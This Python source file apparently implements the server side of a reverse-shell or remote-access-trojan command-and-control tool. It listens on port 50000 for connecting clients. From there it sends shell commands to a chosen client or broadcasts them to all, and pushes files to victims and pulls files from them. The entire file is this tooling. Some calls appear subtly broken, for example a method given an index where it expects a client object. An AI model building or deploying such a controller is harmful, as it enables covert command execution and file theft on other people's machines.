import socket
import threading
import os
import time

BUFFER_SIZE = 1024

PORT = 50000

# Another way to get the local IP address automatically
# HOST = socket.gethostbyname(socket.gethostname())
HOST = "0.0.0.0"
FORMAT = "UTF-8"


# Colored printing functions


class Interface:

    @staticmethod
    def prGreen(skk):
        print("\033[92m {}\033[00m".format(skk))

    @staticmethod
    def prYellow(skk):
        print("\033[93m {}\033[00m".format(skk))

    @staticmethod
    def prRed(skk):
        print("\033[91m {}\033[00m".format(skk))

    @staticmethod
    def mainMenu(serverObj):
        while True:
            serverObj.showConnections(serverObj)
            Interface.prYellow("Enter Command")
            command = input("").split()
            if not len(command):
                continue

            match command[0].lower():
                case "help":
                    Interface.helpMenu()
                case "showall":
                    serverObj.showConnections(serverObj)
                case "send":
                    if len(command) != 2:
                        Interface.prYellow("Format should be: send [index]")
                    else:
                        os.system("clear")
                        serverObj.handleClient(serverObj, int(command[1]))
                        os.system("clear")
                case "broadcast":
                    serverObj.broadcast(serverObj)
                case "clear":
                    os.system("clear")
                case "close":
                    if len(command) != 2:
                        Interface.prYellow("Format should be: close [index]")
                    else:
                        serverObj.closeConnection(serverObj, int(command[1]))
                        Interface.prYellow("Client Closed")
                case "closeall":
                    serverObj.closeAllConnections(serverObj)
                case "rename":
                    if len(command) != 2:
                        Interface.prYellow("Format should be: rename [index]")
                    else:
                        serverObj.renameConnection(serverObj, int(command[1]))
                case "exit":
                    serverObj.closeAllConnections(serverObj)
                    Server.serverSocket.close()
                    exit(0)
                case _:
                    Interface.prYellow("Invalid Command")

    @staticmethod
    def helpMenu():
        Interface.prYellow(f"Options:\n"
                           f"help{16 * ' '}Show help menu.\n"
                           f"showall{13 * ' '}Show connected clients.\n"
                           f"send [index]{8 * ' '}Send commands to the selected client.\n"
                           f"broadcast{11 * ' '}Send a command to all clients.\n"
                           f"close [index]{7 * ' '}Closes the selected client.\n"
                           f"closeall{12 * ' '}Close all clients.\n"
                           f"rename [index]{6 * ' '}Renames the selected client\n"
                           f"clear{15 * ' '}Clear terminal.\n"
                           f"exit{16 * ' '}Exit the program.")

    @staticmethod
    def handleHelpMenu():
        Interface.prYellow(
            f"DOWNLOAD <filepath>/filename.txt <destination>{5 * ' '}Downloads a file from the given path\n"
            f"UPLOAD <filepath>/filename.txt <destination>{5 * ' '}Uploads a file to the given path\n")


class Client:
    clientName = "default_name"
    threadAttr = None

    def __init__(self, argConnection, argAddress):
        self.connection = argConnection
        self.address = argAddress
        self.cwd = self.connection.recv(BUFFER_SIZE).decode()

    def __str__(self):
        return self.address

    def closeMyself(self):
        self.connection.sendall("close".encode(FORMAT))
        self.connection.close()


class Server:
    clientList = []
    connectionCount = 0
    serverSocket = None

    def appendClient(self, argConnection, argAddress):
        tempObj = Client(argConnection, argAddress)
        tempObj.clientName = 'client' + str(self.connectionCount)
        self.clientList.append(tempObj)
        self.connectionCount += 1

    def closeConnection(self, client):
        client.closeMyself()
        self.clientList.remove(client)
        self.connectionCount -= 1

    def closeAllConnections(self):
        # TODO: client list acting funky
        while len(self.clientList):
            self.closeConnection(self, self.clientList[0])

    def showConnections(self):
        if self.connectionCount != 0:
            Interface.prYellow("Active Connections : ")
            for iterator in range(len(self.clientList)):
                Interface.prYellow(
                    f"{iterator} : {self.clientList[iterator].clientName} : {self.clientList[iterator].address}")
        else:
            Interface.prYellow("No connections")

    def renameConnection(self, index):
        Interface.prYellow("Enter new connection name")
        newName = input()
        self.clientList[index].clientName = newName
        Interface.prYellow("Rename successful")

    def handleClient(self, index):
        Interface.prYellow(f"Now handling {self.clientList[index].address} : ")

        while True:
            command = input(f"{self.clientList[index].cwd}:~$ ")
            # empty command
            if not command.strip():
                continue

            splitCommand = command.split()
            if command.lower() == "exit":
                break
            elif command.lower() == "close":
                self.closeConnection(self, index)
                break
            elif command.lower() == "--help":
                Interface.handleHelpMenu()
                continue
            elif splitCommand[0].lower() == "upload":
                self.uploadFile(self, command, splitCommand, index)
            elif splitCommand[0].lower() == "download":
                self.downloadFile(self, command, splitCommand, index)
            else:
                self.sendCommand(self, command, index)
            self.clientList[index].cwd = self.clientList[index].connection.recv(BUFFER_SIZE).decode(FORMAT)

    def sendCommand(self, command, index):
        command = command.encode(FORMAT)
        self.clientList[index].connection.sendall(command)
        response = self.clientList[index].connection.recv(BUFFER_SIZE).decode(FORMAT)
        Interface.prGreen(response)
        command = ''
        response = ''

    def uploadFile(self, mainCommand, splitCommand, index):
        connection = self.clientList[index].connection
        connection.sendall(mainCommand.encode(FORMAT))
        time.sleep(0.3)
        try:
            with open(splitCommand[1], "rb") as targetFile:
                while True:
                    readData = targetFile.read(BUFFER_SIZE)
                    if not readData:
                        time.sleep(0.3)
                        connection.sendall('\0'.encode(FORMAT))
                        break
                    connection.sendall(readData)
                    time.sleep(0.3)
                time.sleep(0.3)
                result = connection.recv(BUFFER_SIZE)
                Interface.prGreen(result.decode(FORMAT))
        except FileNotFoundError:
            Interface.prYellow("File Not Found!")

    def downloadFile(self, mainCommand, splitCommand, index):
        connection = self.clientList[index].connection
        connection.sendall(mainCommand.encode(FORMAT))
        fileName = splitCommand[1].split('/')
        # print(fileName)
        fileName = '/' + fileName[len(fileName) - 1]
        try:
            with open(splitCommand[2] + fileName, "wb") as targetFile:
                while True:
                    dataRead = connection.recv(BUFFER_SIZE)
                    if dataRead.decode().lower() == '\0':
                        break
                    targetFile.write(dataRead)
            Interface.prYellow("File Downloaded!")
        except FileNotFoundError:
            Interface.prYellow("File or Directory Not Found!")

    def broadcast(self):
        Interface.prYellow("Enter Command")
        command = input().encode(FORMAT)
        if len(self.clientList):
            for client in self.clientList:
                client.connection.sendall(command)
                time.sleep(0.5)
                response = client.connection.recv(BUFFER_SIZE).decode(FORMAT)
                Interface.prGreen(f"{client.clientName} : {client.address} -> Response:\n{response}")
                response = ''
                # command = ''
        else:
            Interface.prYellow("No Connections")
        time.sleep(0.5)


def handle_client(conn, addr):
    # print(f"[NEW CONNECTION] {addr} connected.")
    while True:

        # The bufsize argument of 1024 used above is the maximum amount of data to be received at once.
        # It doesn’t mean that .recv() will return 1024 bytes.
        message = input("enter")
        message = message.encode(FORMAT)
        conn.sendall(message)
        # signals that the client closed the connection and the loop is terminated
        if message == "exit".encode(FORMAT):
            print("done")
            break
        data = conn.recv(BUFFER_SIZE).decode(FORMAT)
        print(data)


def starts(serverObject):
    # print("[STARTING] server is starting...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server.bind((HOST, PORT))
    server.listen()
    serverObject.serverSocket = server
    # print(f"[LISTENING] Server is listening on {HOST}")
    while True:
        conn, addr = server.accept()
        Interface.prRed(f"[NEW CONNECTION] {addr} connected.")
        serverObject.appendClient(serverObject, conn, addr)
        serverObject.showConnections(serverObject)
        # handle_client(conn, addr)
        # handle_client(conn, addr)


obj = Server
thr = threading.Thread(target=starts, args=(obj,))
thr.start()
Interface.mainMenu(obj)
